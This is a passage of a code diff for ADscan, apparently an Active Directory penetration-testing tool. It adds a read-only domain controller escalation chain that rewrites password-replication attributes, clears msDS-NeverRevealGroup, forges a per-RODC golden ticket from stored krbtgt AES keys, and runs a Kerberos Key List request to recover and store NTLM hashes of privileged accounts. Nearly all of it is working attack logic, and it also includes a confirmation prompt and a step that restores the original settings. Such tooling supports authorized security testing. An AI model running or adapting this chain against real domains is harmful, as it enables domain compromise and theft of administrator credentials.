+    domain: str,
+    rodc_number: int,
+    target_user: str,
+    output: str,
+) -> str:
+    """Persist raw Key List output in the workspace for later review."""
+    workspace_dir = str(getattr(shell, "current_workspace_dir", "") or "").strip()
+    if not workspace_dir:
+        return ""
+    domains_dir = str(getattr(shell, "domains_dir", "domains") or "domains").strip() or "domains"
+    safe_user = target_user.replace("\\", "_").replace("/", "_").replace(":", "_")
+    path = (
+        Path(workspace_dir)
+        / domains_dir
+        / domain
+        / "kerberos"
+        / "key_list"
+        / f"rodc_{rodc_number}_{safe_user}.txt"
+    )
+    try:
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(output, encoding="utf-8")
+    except OSError as exc:
+        telemetry.capture_exception(exc)
+        print_info_debug(
+            "[rodc] failed to save Kerberos Key List output: "
+            f"{mark_sensitive(str(exc), 'detail')}"
+        )
+        return ""
+    return str(path)
+
+
+def _print_rodc_prp_key_list_transaction_plan(
+    *,
+    domain: str,
+    target_user: str,
+    kdc_host: str,
+    key_username: str,
+    rodc_number: int,
+) -> None:
+    """Explain the forged-ticket transaction ADscan is about to run while PRP is active."""
+    print_panel(
+        "\n".join(
+            [
+                f"Domain: {mark_sensitive(domain, 'domain')}",
+                f"Target privileged principal: {mark_sensitive(target_user, 'user')}",
+                f"KDC host: {mark_sensitive(kdc_host, 'hostname')}",
+                "Per-RODC krbtgt material: "
+                f"{mark_sensitive(key_username, 'user')} "
+                f"(RODC #{mark_sensitive(str(rodc_number), 'detail')})",
+                "",
+                "ADscan will now:",
+                "1. Forge a fresh per-RODC golden ticket for the selected user.",
+                "2. Use that forged ticket immediately for a Kerberos Key List request while PRP is still active.",
+                "3. Parse and store any recovered credential material before cleanup restores the original LDAP state.",
+            ]
+        ),
+        title="[bold blue]RODC Key List Transaction[/bold blue]",
+        border_style="blue",
+        expand=False,
+    )
+
+
+def _maybe_run_rodc_key_list_after_prp(
+    shell: Any,
+    *,
+    domain: str,
+    rodc_machine: str,
+    target_user: str,
+    kdc_host: str,
+) -> bool:
+    """Run Key List while the PRP change is still active, when AES material exists."""
+    key_plan = resolve_rodc_krbtgt_key_plan(
+        shell,
+        domain=domain,
+        target_computer=rodc_machine,
+    )
+    if key_plan is None:
+        print_info(
+            "PRP is prepared, but ADscan has no stored per-RODC krbtgt material yet. "
+            "Run the RODC krbtgt extraction follow-up first."
+        )
+        return False
+
+    rodc_aes_key = _resolve_rodc_aes_key_from_workspace(
+        shell,
+        domain=domain,
+        key_username=key_plan.username,
+    )
+    if not rodc_aes_key:
+        print_warning(
+            "PRP is prepared, but ADscan cannot complete the cache-to-credential step because "
+            "the stored per-RODC krbtgt material only contains NT/RC4. Kerberos Key List requires AES128/AES256."
+        )
+        return False
+
+    rodc_number = int(key_plan.rid)
+    print_info_debug(
+        "[rodc] prp-active Kerberos Key List is ready: "
+        f"target={mark_sensitive(target_user, 'user')} "
+        f"rodc_key={mark_sensitive(key_plan.username, 'user')} "
+        f"rodc_number={mark_sensitive(str(rodc_number), 'detail')} "
+        f"kdc={mark_sensitive(kdc_host, 'hostname')}"
+    )
+    _print_rodc_prp_key_list_transaction_plan(
+        domain=domain,
+        target_user=target_user,
+        kdc_host=kdc_host,
+        key_username=key_plan.username,
+        rodc_number=rodc_number,
+    )
+
+    if not getattr(shell, "auto", False) and not Confirm.ask(
+        "Forge the per-RODC golden ticket and run Kerberos Key List now for "
+        f"{mark_sensitive(target_user, 'user')} while PRP is active?",
+        default=True,
+    ):
+        print_info("Skipping Kerberos Key List by user choice.")
+        return False
+
+    ticket_path = _forge_rodc_golden_ticket_for_prp_key_list(
+        shell,
+        domain=domain,
+        rodc_machine=rodc_machine,
+        target_user=target_user,
+        rodc_number=rodc_number,
+        rodc_aes_key=rodc_aes_key,
+    )
+    if not ticket_path:
+        print_warning(
+            "Kerberos Key List was not attempted because ADscan could not prepare "
+            "a forged RODC ticket for the selected account."
+        )
+        return False
+
+    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+    dc_ip = ""
+    if isinstance(domain_data, dict):
+        dc_ip = str(domain_data.get("dc_ip") or "").strip()
+    request = KerberosKeyListRequest(
+        domain=domain,
+        kdc_host=kdc_host,
+        rodc_number=rodc_number,
+        rodc_aes_key=rodc_aes_key,
+        targets=(target_user,),
+        ccache_path=ticket_path,
+        use_kerberos=True,
+        dc_ip=dc_ip or None,
+        impacket_scripts_dir=str(getattr(shell, "impacket_scripts_dir", "") or "").strip()
+        or None,
+    )
+
+    with active_step_followup(
+        shell,
+        source="rodc_prp_transaction",
+        title="Run Kerberos Key List",
+    ):
+        outcome = KerberosKeyListService().run(
+            request,
+            run_command=getattr(shell, "run_command", None),
+        )
+
+    if outcome.raw_output:
+        output_path = _save_rodc_key_list_output(
+            shell,
+            domain=domain,
+            rodc_number=rodc_number,
+            target_user=target_user,
+            output=outcome.raw_output,
+        )
+        if output_path:
+            print_info(
+                f"Kerberos Key List output saved to {mark_sensitive(output_path, 'path')}."
+            )
+    if not outcome.success:
+        print_warning(
+            "Kerberos Key List did not recover credentials while PRP was active: "
+            f"{mark_sensitive(outcome.error_message or 'unknown error', 'detail')}"
+        )
+        return False
+
+    for credential in outcome.credentials:
+        add_credential = getattr(shell, "add_credential", None)
+        if callable(add_credential):
+            add_credential(
+                credential.domain.lower(),
+                credential.username,
+                credential.nt_hash,
+            )
+
+    recovered = ", ".join(
+        mark_sensitive(item.username, "user") for item in outcome.credentials
+    )
+    RodcFollowupStateService().mark_key_list_completed(
+        shell,
+        domain=domain,
+        target_computer=rodc_machine,
+        target_user=target_user,
+    )
+    print_success(
+        f"Kerberos Key List recovered NTLM material for {recovered} while PRP was active."
+    )
+    return True
 
 
 def _build_rodc_prp_tracking_context(
@@ -1055,7 +1804,9 @@ def _build_rodc_prp_tracking_context(
                     continue
                 if str(step.get("action") or "").strip().lower() != "managerodcprp":
                     continue
-                details = step.get("details") if isinstance(step.get("details"), dict) else {}
+                details = (
+                    step.get("details") if isinstance(step.get("details"), dict) else {}
+                )
                 candidate_from = str(details.get("from") or "").strip()
                 candidate_to = str(details.get("to") or "").strip()
                 if candidate_from:
@@ -1101,6 +1852,8 @@ def offer_rodc_escalation(
     policy_username = username
     policy_password = password
     policy_actor_label = username
+    assessment: CurrentVantageTargetAssessment | None = None
+    target_user = ""
     try:
         if getattr(shell, "get_user_dc_role", None) is not None:
             dc_role = shell.get_user_dc_role(domain, normalized_machine)
@@ -1125,6 +1878,16 @@ def offer_rodc_escalation(
             machine_account=normalized_machine,
             actor_username=username,
         )
+        print_info_debug(
+            "[rodc] object-control assessment: "
+            f"ready={bool(object_control.get('ready'))} "
+            f"reason={mark_sensitive(str(object_control.get('reason') or 'unknown'), 'detail')} "
+            f"candidate_paths={len(list(object_control.get('candidate_paths') or []))} "
+            f"candidates={len(list(object_control.get('candidates') or []))} "
+            f"current_actor_ready={bool(object_control.get('current_actor_ready'))} "
+            f"auto={bool(getattr(shell, 'auto', False))} "
+            f"target={mark_sensitive(str(object_control.get('target_label') or normalized_machine), 'user')}"
+        )
         if bool(object_control.get("ready")):
             print_info_debug(
                 "[rodc] existing prerequisite already satisfied; skipping prerequisite-path executor: "
@@ -1137,10 +1900,27 @@ def offer_rodc_escalation(
             actor_username=username,
             object_control=object_control,
         )
+        object_control = _maybe_select_ready_rodc_object_control_path(
+            shell,
+            domain=domain,
+            machine_account=normalized_machine,
+            actor_username=username,
+            object_control=object_control,
+        )
+        print_info_debug(
+            "[rodc] object-control after ready-path selection: "
+            f"ready={bool(object_control.get('ready'))} "
+            f"reason={mark_sensitive(str(object_control.get('reason') or 'unknown'), 'detail')} "
+            f"candidate_paths={len(list(object_control.get('candidate_paths') or []))} "
+            f"candidates={len(list(object_control.get('candidates') or []))} "
+            f"current_actor_ready={bool(object_control.get('current_actor_ready'))}"
+        )
         if not bool(object_control.get("ready")):
             _print_rodc_object_control_guidance(
                 domain=domain,
-                target_label=str(object_control.get("target_label") or normalized_machine),
+                target_label=str(
+                    object_control.get("target_label") or normalized_machine
+                ),
                 actor_username=username,
                 reason=str(object_control.get("reason") or "unknown"),
                 candidates=list(object_control.get("candidates") or []),
@@ -1157,29 +1937,41 @@ def offer_rodc_escalation(
         if not isinstance(selected_policy_actor, dict):
             _print_rodc_object_control_guidance(
                 domain=domain,
-                target_label=str(object_control.get("target_label") or normalized_machine),
+                target_label=str(
+                    object_control.get("target_label") or normalized_machine
+                ),
                 actor_username=username,
                 reason=str(policy_actor.get("reason") or "unknown"),
                 candidates=list(policy_actor.get("candidates") or []),
             )
             return False
 
-        policy_username = str(
-            selected_policy_actor.get("credential_username")
-            or selected_policy_actor.get("username")
+        policy_username = (
+            str(
+                selected_policy_actor.get("credential_username")
+                or selected_policy_actor.get("username")
+                or username
+            ).strip()
             or username
-        ).strip() or username
-        policy_password = str(selected_policy_actor.get("credential_secret") or "").strip()
-        policy_actor_label = str(
-            selected_policy_actor.get("label")
-            or selected_policy_actor.get("username")
+        )
+        policy_password = str(
+            selected_policy_actor.get("credential_secret") or ""
+        ).strip()
+        policy_actor_label = (
+            str(
+                selected_policy_actor.get("label")
+                or selected_policy_actor.get("username")
+                or policy_username
+            ).strip()
             or policy_username
-        ).strip() or policy_username
-        tracking_from_label, tracking_to_label, tracking_notes = _build_rodc_prp_tracking_context(
-            domain=domain,
-            rodc_machine=normalized_machine,
-            selected_policy_actor=selected_policy_actor,
-            policy_actor_label=policy_actor_label,
+        )
+        tracking_from_label, tracking_to_label, tracking_notes = (
+            _build_rodc_prp_tracking_context(
+                domain=domain,
+                rodc_machine=normalized_machine,
+                selected_policy_actor=selected_policy_actor,
+                policy_actor_label=policy_actor_label,
+            )
         )
 
         domain_data = getattr(shell, "domains_data", {}).get(domain, {})
@@ -1219,12 +2011,13 @@ def offer_rodc_escalation(
                     "ADscan will update LDAP attributes on the RODC object before attempting the follow-up."
                 ),
                 planned_changes=[
-                    "Add the selected privileged account to msDS-RevealOnDemandGroup.",
-                    "If needed, remove that account from msDS-NeverRevealGroup.",
+                    "Add the selected privileged account and the Allowed RODC Password Replication Group to msDS-RevealOnDemandGroup.",
+                    "Temporarily clear msDS-NeverRevealGroup so group-based deny entries cannot block the selected account.",
                 ],
                 impact_notes=[
                     "This can allow privileged credentials to be replicated or cached on the RODC.",
-                    f"ADscan will use {policy_actor_label} for the LDAP policy phase and {username} for the host-side dump phase.",
+                    f"ADscan will use {policy_actor_label} for the LDAP policy phase.",
+                    "ADscan will not run the legacy generic LSA dump from this PRP step.",
                     "ADscan will try to restore the original LDAP attribute values during cleanup.",
                 ],
                 cleanup_notes=[
@@ -1260,6 +2053,24 @@ def offer_rodc_escalation(
             assessment,
             fallback_host=normalized_machine.rstrip("$"),
         )
+        key_plan = resolve_rodc_krbtgt_key_plan(
+            shell,
+            domain=domain,
+            target_computer=normalized_machine,
+        )
+        key_list_ready = False
+        key_plan_username: str | None = None
+        rodc_number: int | None = None
+        if key_plan is not None:
+            key_plan_username = str(key_plan.username or "").strip() or None
+            rodc_number = int(key_plan.rid)
+            key_list_ready = bool(
+                _resolve_rodc_aes_key_from_workspace(
+                    shell,
+                    domain=domain,
+                    key_username=key_plan.username,
+                )
+            )
         _print_rodc_followup_execution_plan(
             domain=domain,
             rodc_machine=normalized_machine,
@@ -1267,6 +2078,9 @@ def offer_rodc_escalation(
             host_actor=username,
             ldap_actor_label=policy_actor_label,
             target_user=target_user,
+            key_list_ready=key_list_ready,
+            key_plan_username=key_plan_username,
+            rodc_number=rodc_number,
         )
 
         service = ExploitationService()
@@ -1320,8 +2134,10 @@ def offer_rodc_escalation(
         original_reveal_values = tuple(reveal_values)
         original_never_reveal_values = tuple(never_reveal_values)
 
-        updated_reveal_values = _normalize_attr_values([*reveal_values, allowed_group_dn, target_user_dn])
-        removed_from_never_reveal = False
+        updated_reveal_values = _normalize_attr_values(
+            [*reveal_values, allowed_group_dn, target_user_dn]
+        )
+        cleared_never_reveal = False
         with active_step(
             shell,
             domain=domain,
@@ -1373,12 +2189,7 @@ def offer_rodc_escalation(
                 return False
             cleanup_required = True
 
-            if any(value.casefold() == target_user_dn.casefold() for value in never_reveal_values):
-                updated_never_reveal_values = tuple(
-                    value
-                    for value in never_reveal_values
-                    if value.casefold() != target_user_dn.casefold()
-                )
+            if never_reveal_values:
                 never_reveal_update = service.acl.set_object_attribute_values(
                     pdc_host=pdc_host,
                     bloody_path=bloody_path,
@@ -1387,7 +2198,7 @@ def offer_rodc_escalation(
                     password=policy_password,
                     target_object=normalized_machine,
                     attribute_name="msDS-NeverRevealGroup",
-                    attribute_values=updated_never_reveal_values,
+                    attribute_values=(),
                     kerberos=True,
                 )
                 if not never_reveal_update.success:
@@ -1407,7 +2218,7 @@ def offer_rodc_escalation(
                         "Failed to update msDS-NeverRevealGroup on the RODC object."
                     )
                     return False
-                removed_from_never_reveal = True
+                cleared_never_reveal = True
 
             update_active_step_status(
                 shell,
@@ -1420,9 +2231,12 @@ def offer_rodc_escalation(
                     "rodc_dn": rodc_dn,
                     "updated_attributes": (
                         ("msDS-RevealOnDemandGroup", "msDS-NeverRevealGroup")
-                        if removed_from_never_reveal
+                        if cleared_never_reveal
                         else ("msDS-RevealOnDemandGroup",)
                     ),
+                    "never_reveal_action": "cleared_temporarily"
+                    if cleared_never_reveal
+                    else "unchanged_empty",
                 },
             )
 
@@ -1432,6 +2246,12 @@ def offer_rodc_escalation(
         print_success(
             f"RODC follow-up prepared password replication for {marked_target_user} on {marked_rodc} in {marked_domain} using {mark_sensitive(policy_actor_label, 'user')}."
         )
+        RodcFollowupStateService().mark_prp_prepared(
+            shell,
+            domain=domain,
+            target_computer=normalized_machine,
+            target_user=target_user,
+        )
         summary_lines = [
             f"RODC object DN: {mark_sensitive(rodc_dn, 'path')}",
             f"Target account DN: {mark_sensitive(target_user_dn, 'path')}",
@@ -1439,9 +2259,9 @@ def offer_rodc_escalation(
             f"RODC host actor: {mark_sensitive(username, 'user')}",
             "Updated attribute: msDS-RevealOnDemandGroup",
         ]
-        if removed_from_never_reveal:
+        if cleared_never_reveal:
             summary_lines.append(
-                "Updated attribute: msDS-NeverRevealGroup (target removed)"
+                "Updated attribute: msDS-NeverRevealGroup (temporarily cleared; restored during cleanup)"
             )
         print_panel(
             "\n".join(summary_lines),
@@ -1449,20 +2269,13 @@ def offer_rodc_escalation(
             border_style="green",
             expand=False,
         )
-
-        if 445 in set(assessment.open_ports):
-            _maybe_dump_rodc_lsa(
-                shell,
-                domain=domain,
-                host=preferred_host,
-                username=username,
-                password=password,
-            )
-            _print_rodc_post_dump_guidance(host=preferred_host)
-        else:
-            print_info(
-                f"Next step: authenticate to {mark_sensitive(preferred_host, 'hostname')} as {mark_sensitive(username, 'user')} and dump the RODC LSA secrets to recover the per-RODC krbtgt material (for example `krbtgt_<RODC number>`)."
-            )
+        _maybe_run_rodc_key_list_after_prp(
+            shell,
+            domain=domain,
+            rodc_machine=normalized_machine,
+            target_user=target_user,
+            kdc_host=pdc_host,
+        )
         return True
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
@@ -1485,9 +2298,27 @@ def offer_rodc_escalation(
             marked_rodc = mark_sensitive(normalized_machine, "user")
             marked_domain = mark_sensitive(domain, "domain")
             if cleanup_completed:
+                RodcFollowupStateService().mark_prp_restored(
+                    shell,
+                    domain=domain,
+                    target_computer=normalized_machine,
+                    target_user=target_user,
+                )
                 print_info(
                     f"RODC follow-up cleanup completed: restored the original password-replication attributes on {marked_rodc} in {marked_domain}."
                 )
+                try:
+                    _print_rodc_prp_next_steps(
+                        host=_first_hostname_candidate(
+                            assessment,
+                            fallback_host=normalized_machine.rstrip("$"),
+                        ),
+                        target_user=target_user,
+                        cleanup_completed=True,
+                    )
+                except Exception as exc:  # noqa: BLE001
+                    telemetry.capture_exception(exc)
+                    print_info_debug(f"[rodc] failed to render PRP next steps: {exc}")
             else:
                 _print_rodc_cleanup_manual_guidance(
                     domain=domain,
@@ -1495,6 +2326,18 @@ def offer_rodc_escalation(
                     reveal_values=original_reveal_values,
                     never_reveal_values=original_never_reveal_values,
                 )
+                try:
+                    _print_rodc_prp_next_steps(
+                        host=_first_hostname_candidate(
+                            assessment,
+                            fallback_host=normalized_machine.rstrip("$"),
+                        ),
+                        target_user=target_user,
+                        cleanup_completed=False,
+                    )
+                except Exception as exc:  # noqa: BLE001
+                    telemetry.capture_exception(exc)
+                    print_info_debug(f"[rodc] failed to render PRP next steps: {exc}")
         try:
             execute_cleanup_scope(shell, scope_id=cleanup_scope_id)
         finally:
